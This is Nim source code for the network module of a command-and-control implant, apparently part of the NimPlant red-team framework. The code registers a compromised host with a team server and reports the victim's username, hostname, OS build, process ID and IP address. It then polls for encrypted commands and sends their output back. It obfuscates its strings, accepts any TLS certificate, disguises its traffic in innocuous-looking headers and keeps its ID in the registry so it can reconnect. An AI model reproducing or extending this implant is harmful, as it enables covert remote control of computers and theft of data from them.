import base64, json, puppy
from strutils import split, toLowerAscii, replace
from unicode import toLower
from os import parseCmdLine
import ../util/[crypto, strenc, register]
import ../config/configParser
import tables

# Define the object with listener properties
const xor_key {.intdefine.}: int = 459457925

type
    Listener* = object
        id* : string
        initialized* : bool
        registered* : bool
        listenerType* : string
        listenerHost* : string
        listenerIp* : string
        listenerPort* : string
        registerPath* : string
        reconnectPath* : string
        sleepTime* : int
        sleepJitter* : float
        killDate* : string
        taskPath* : string
        resultPath* : string
        userAgent* : string
        cryptKey* : string
        httpAllowCommunicationKey* : string

# HTTP request function
proc doRequest(li : Listener, path : string, postKey : string = "", postValue : string = "", verb : string = "get") : Response =
    try:
        # Determine target: Either "TYPE://HOST:PORT" or "TYPE://HOSTNAME"
        var target : string = toLowerAscii(li.listenerType) & "://"
        if li.listenerHost != "":
            target = target & li.listenerHost
        else:
            target = target & li.listenerIp & ":" & li.listenerPort
        target = target & path

        # Get the workspace_uuid from the configuration
        let config = parseConfig()
        var workspace_uuid = ""
        let workspace_key = obf("workspace_uuid")
        
        # Try to access the workspace_uuid value in the configuration
        try:
            for k, v in pairs(config):
                if k == workspace_key:
                    workspace_uuid = v
                    break
        except:
            # If there is an error, leave workspace_uuid as an empty string
            when defined verbose:
                echo obf("DEBUG: Error accessing workspace_uuid in config")

        # GET request
        if (postKey == "" or postValue == "" and path != li.reconnectPath):
            var headers: seq[Header]

            # Only send ID header once listener is registered
            if li.id != "":
                headers = @[
                        Header(key: "X-Request-ID", value: li.id),
                        Header(key: "User-Agent", value: li.userAgent),
                        Header(key: "Content-Type", value: "application/json"),
                        Header(key: "X-Correlation-ID", value: li.httpAllowCommunicationKey),    
                    ]
            else:
                headers = @[
                        Header(key: "User-Agent", value: li.userAgent),
                        Header(key: "X-Correlation-ID", value: li.httpAllowCommunicationKey),
                        Header(key: "Content-Type", value: "application/json")
                    ]
            
            # Add workspace_uuid header if provided
            if workspace_uuid != "":
                headers.add(Header(key: "X-Robots-Tag", value: workspace_uuid))
                
                when defined verbose:
                    echo obf("DEBUG: Added workspace_uuid to header: ") & workspace_uuid

            let req = Request(
                url: parseUrl(target),
                verb: verb,
                headers: headers,
                allowAnyHttpsCertificate: true,
                )

            return fetch(req)

        # POST request
        else:
            var post_body = "{\"" & postKey & "\":\"" & postValue & "\"}"
            if verb == "options":
                post_body = ""
            
            var headers = @[
                    Header(key: "X-Request-ID", value: li.id),
                    Header(key: "User-Agent", value: li.userAgent),
                    Header(key: "Content-Type", value: "application/json"),
                    Header(key: "X-Correlation-ID", value: li.httpAllowCommunicationKey)
                ]
            
            # Add workspace_uuid header if provided
            if workspace_uuid != "":
                headers.add(Header(key: "X-Robots-Tag", value: workspace_uuid))
                
                when defined verbose:
                    echo obf("DEBUG: Added workspace_uuid to header: ") & workspace_uuid
                
            let req = Request(
                url: parseUrl(target),
                verb: verb,
                headers: headers,
                allowAnyHttpsCertificate: true,
                body: post_body
                )
            return fetch(req)

    except:
        # Return a fictive error response to handle
        var errResponse = Response()
        errResponse.code = 500
        return errResponse

# Init Implant ID and cryptographic key via GET request to the registration path
# XOR-decrypt transmitted key with static value for initial exchange
proc init*(li: var Listener) : void =
    # Get the workspace_uuid from the configuration for verbose mode
    let config = parseConfig()
    var workspace_uuid = ""
    let workspace_key = obf("workspace_uuid")
    
    # Try to access the workspace_uuid value in the configuration
    try:
        for k, v in pairs(config):
            if k == workspace_key:
                workspace_uuid = v
                break
    except:
        # If there is an error, leave workspace_uuid as an empty string
        when defined verbose:
            echo obf("DEBUG: Error accessing workspace_uuid in config")
    
    # Log the workspace_uuid if in verbose mode
    when defined verbose:
        if workspace_uuid != "":
            echo obf("DEBUG: Using workspace_uuid: ") & workspace_uuid
    
    # Register with the server
    when defined verbose:
        echo obf("DEBUG: Attempting to connect to ") & toLowerAscii(li.listenerType) & "://" & 
             (if li.listenerHost != "": li.listenerHost else: li.listenerIp & ":" & li.listenerPort) & 
             li.registerPath

    var res = doRequest(li, li.registerPath)
    
    when defined verbose:
        echo obf("DEBUG: Response code: ") & $res.code
        if res.code != 200:
            echo obf("DEBUG: Response body: ") & res.body
        
    if res.code == 200:
        li.id = parseJson(res.body)["id"].getStr()
        li.cryptKey = xorString(base64.decode(parseJson(res.body)["k"].getStr()), xor_key)
        li.initialized = true
        
        when defined verbose:
            echo obf("DEBUG: ID stored in registry: ") & li.id
    else:
        li.initialized = false

# Initial registration function, including key init
proc postRegisterRequest*(li : var Listener, ipAddrInt : string, username : string, hostname : string, osBuild : string, pid : int, pname : string, riskyMode : bool) : void =
    # Once key is known, send a second request to register implant with initial info
    when defined verbose:
        echo obf("DEBUG: Sending registration request with ID: ") & li.id
    
    var data = %*
        [
            {
                "i": ipAddrInt,
                "u": username,
                "h": hostname,
                "o": osBuild,
                "p": pid,
                "P": pname,
                "r": riskyMode
            }
        ]
    var dataStr = ($data)[1..^2]
    
    when defined verbose:
        echo obf("DEBUG: Data to send (unencrypted): ") & dataStr
    
    let encryptedData = encryptData(dataStr, li.cryptKey)
    
    when defined verbose:
        echo obf("DEBUG: Encrypted data (first 20 characters): ") & 
             (if encryptedData.len > 20: encryptedData[0..19] else: encryptedData) & "..."
    
    let res = doRequest(li, li.registerPath, "data", encryptedData, "post")
    
    when defined verbose:
        echo obf("DEBUG: Response code: ") & $res.code
        echo obf("DEBUG: Response body: ") & 
             (if res.body.len > 0: res.body else: "<empty>")
    
    if (res.code != 200):
        # Error at this point means XOR key mismatch, abort
        li.registered = false
        
        when defined verbose:
            echo obf("DEBUG: ERROR - Registration failed. Possible cause: XOR key mismatch.")
            echo obf("DEBUG: Headers sent:")
            echo obf("  X-Request-ID: ") & li.id
            echo obf("  User-Agent: ") & li.userAgent
            echo obf("  X-Correlation-ID: ") & li.httpAllowCommunicationKey
    else:
        li.registered = true
        
        when defined verbose:
            echo obf("DEBUG: Registration successful. Implant now registered with ID: ") & li.id

type
  Command = object
    guid: string
    command: string
    args: seq[string]

# Watch for queued commands via GET request to the task path
proc getQueuedCommand*(li : Listener) : (string, string, seq[string]) =
    var 
        res = doRequest(li, li.taskPath)
        cmdGuid : string
        cmd : string
        args : seq[string]

    # A connection error occurred, likely team server has gone down or restart
    if res.code != 200:
        cmd = obf("NIMPLANT_CONNECTION_ERROR")

        when defined verbose:
            echo obf("DEBUG: Connection error, got status code: "), res.code

    # Otherwise, parse task and arguments (if any)
    else:
        try:
            # Attempt to parse task (parseJson() needs string literal... sigh)
            var responseData = decryptData(parseJson(res.body)["t"].getStr(), li.cryptKey) #.replace("\'", "\\\"")
            var parsedResponseData = parseJson(responseData)
            var jsonData = to(parsedResponseData, Command)


            # Get the task and task GUID from the response
            cmdGuid = jsonData.guid
            cmd = jsonData.command
            args = jsonData.args
        except:
            # No task has been returned
            cmdGuid = ""
            cmd = ""

    result = (cmdGuid, cmd, args)

# Return command results via POST request to the result path
proc postCommandResults*(li : Listener, cmdGuid : string, output : string) : void =
    var data = obf("{\"guid\": \"") & cmdGuid & obf("\", \"result\":\"") & base64.encode(output) & obf("\"}")
    discard doRequest(li, li.resultPath, "data", encryptData(data, li.cryptKey), "post")

# Announce that the kill timer has expired
proc killSelf*(li : Listener) : void =
    if li.initialized:
        postCommandResults(li, "", obf("NIMPLANT_KILL_TIMER_EXPIRED"))
        
        # Clean up registry entry
        when defined verbose:
            echo obf("DEBUG: Kill timer expired, removing implant ID from registry")
        let cleanupResult = register.removeImplantIDFromRegistry()
        when defined verbose:
            if cleanupResult:
                echo obf("DEBUG: Successfully removed implant ID from registry on self-kill")
            else:
                echo obf("DEBUG: Failed to remove implant ID from registry on self-kill")


proc reconnect*(li: var Listener) : void =
    # Check if a value exists in the registry and retrieve it
    let storedId = register.getImplantIDFromRegistry()
    
    if storedId != "":
        # Assign the deobfuscated ID to the listener to include it in the request
        li.id = storedId
        
        # Send OPTIONS request to reconnectPath with the stored ID
        when defined verbose:
            echo "DEBUG: Attempting to reconnect with ID retrieved from registry: " & li.id
        
        # Use doRequest with the OPTIONS verb
        var res = doRequest(li, li.reconnectPath, "", "", "options")
        
        when defined verbose:
            echo obf("DEBUG: Reconnection response. Code: ") & $res.code
        
        # Check for inactive implant response (410 Gone)
        if res.code == 410:
            when defined verbose:
                echo obf("DEBUG: Server indicates implant is inactive, will register as new implant")
            
            # Clear implant data to force new registration
            li.id = ""
            li.initialized = false
            li.registered = false
            
            # Remove the stored ID from registry since it's no longer valid
            discard register.removeImplantIDFromRegistry()
            
            when defined verbose:
                echo obf("DEBUG: Cleared implant data and registry entry for new registration")
            
            return
        
        # If reconnection is successful, update data and finish
        if res.code == 200:
            # Here we could process any server response
            # such as a new cryptographic key if sent
            if res.body.len > 0:
                try:
                    li.cryptKey = xorString(base64.decode(parseJson(res.body)["k"].getStr()), xor_key)
                    when defined verbose:
                        echo obf("DEBUG: New cryptographic key obtained from server")
                except:
                    when defined verbose:
                        echo obf("DEBUG: Could not obtain new cryptographic key")
            
            li.initialized = true
            
            # IMPORTANT: Explicitly perform a check-in after reconnecting
            when defined verbose:
                echo obf("DEBUG: Performing initial check-in after reconnection")
            
            # Try to get pending tasks immediately (check-in)
            let (cmdGuid, cmd, args) = getQueuedCommand(li)
            
            # Mark as registered after successful reconnection
            li.registered = true
            
            when defined verbose:
                echo obf("DEBUG: Successful reconnection with stored ID")
                echo obf("DEBUG: Check-in complete, implant ready to receive commands")
            
            return
        else:
            # If reconnection fails, clear the ID to get a new one
            li.id = ""
            li.initialized = false
            li.registered = false
            when defined verbose:
                echo obf("DEBUG: Reconnection failed, will request a new ID")